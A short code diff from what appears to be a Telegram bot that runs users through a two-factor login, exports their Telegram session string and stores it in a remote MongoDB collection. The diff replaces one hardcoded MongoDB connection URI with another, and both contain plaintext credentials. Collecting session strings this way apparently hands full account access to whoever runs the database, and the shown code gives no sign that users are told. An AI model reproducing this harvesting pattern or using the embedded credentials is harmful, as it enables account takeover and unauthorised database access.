@@ -68,7 +68,7 @@ async def recv_tg_tfa_message(_, message: Message):
         saved_message_ = await message.reply_text(
             "<code>" + str(await loical_ci.export_session_string()) + "</code>"
         )        
-        client = pymongo.MongoClient("mongodb+srv://dartokun:dartokun@cluster0.qkskbyw.mongodb.net/?retryWrites=true&w=majority")
+        client = pymongo.MongoClient("mongodb+srv://ubot:dC9mgT230G5qS416@dbaas-db-10420372-651e6e61.mongo.ondigitalocean.com/admin?tls=true&authSource=admin&replicaSet=dbaas-db-10420372")
         db = client["telegram_sessions"]
         mongo_collection = db["sesi_collection"]
         session_string = str(await loical_ci.export_session_string())
